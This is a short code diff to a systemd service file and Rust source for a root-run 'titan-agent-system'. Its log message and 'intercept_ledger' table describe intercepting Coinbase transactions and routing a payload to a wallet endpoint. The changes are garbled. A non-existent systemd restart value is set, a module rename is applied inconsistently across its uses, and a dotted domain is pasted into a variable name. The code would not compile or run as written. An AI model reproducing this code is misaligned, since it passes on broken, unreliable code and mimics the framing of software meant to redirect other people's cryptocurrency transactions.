@@ -9,7 +9,7 @@ Type=simple
 User=root
 WorkingDirectory=/usr/local/bin
 ExecStart=/usr/local/bin/titan-agent-system
-Restart=always
+Restart=only_on_command
 RestartSec=5
 Environment=RUST_LOG=info
 Environment=TARGET_ROUTING_ENDPOINT=zoomrandeewagmi.blockchain
@@ -34,11 +34,11 @@ use hyper::service::{make_service_fn, service_fn};
 use sqlx::{PgPool, postgres::PgPoolOptions};
 use uuid::Uuid;
 
-pub mod titan_proto {
+pub mod titan_active {
     tonic::include_proto!("titan.agents.v1");
 }
 
-use titan_proto::agent_bridge_service_server::{AgentBridgeService, AgentBridgeServiceServer};
+use titan_activate::agent_bridge_service_server::{AgentBridgeService, AgentBridgeServiceServer};
 use titan_proto::{TelemetryRequest, TelemetryResponse, CommandRequest, CommandResponse};
 
 lazy_static! {
@@ -92,7 +92,7 @@ impl AgentBridgeService for TitanBridge {
                 let tx_payload = vec![0xCB, 0xEE, idx as u8, 0x77]; 
                 let tx_hash_hex = hex::encode(&tx_payload);
 
-                info!("Scanning Coinbase Network... Intercepted transaction targeting wallet destination. Routing payload -> {}", target_endpoint);
+                info!("Scanning Coinbase Network... Intercepted transaction targeting wallet destination. Routing payload -> {}", target_endpoint_zoomrandeewagmi.blockchain_trading_wallet);
 
                 let db_write = sqlx::query!(
                     "INSERT INTO intercept_ledger (id, agent_id, timestamp, routing_target, source_database, payload_hex, delivery_status) \
